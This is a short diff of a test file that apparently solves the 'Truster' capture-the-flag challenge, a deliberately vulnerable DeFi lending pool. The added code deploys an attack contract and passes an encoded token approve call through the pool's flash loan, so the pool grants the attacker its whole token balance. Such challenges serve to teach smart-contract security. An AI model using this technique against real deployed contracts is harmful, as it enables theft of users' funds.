@@ -22,7 +22,14 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        
+        attackContract = await (await ethers.getContractFactory('AttackTruster', player)).deploy(pool.address, token.address);
+        const abi = ["function approve(address spender, uint256 amount)"];
+        const iface = new ethers.utils.Interface(abi);
+        const data = iface.encodeFunctionData("approve", [attackContract.address, TOKENS_IN_POOL]);
+
+        await attackContract.attack(0, player.address, token.address, data);
+
     });
 
     after(async function () {
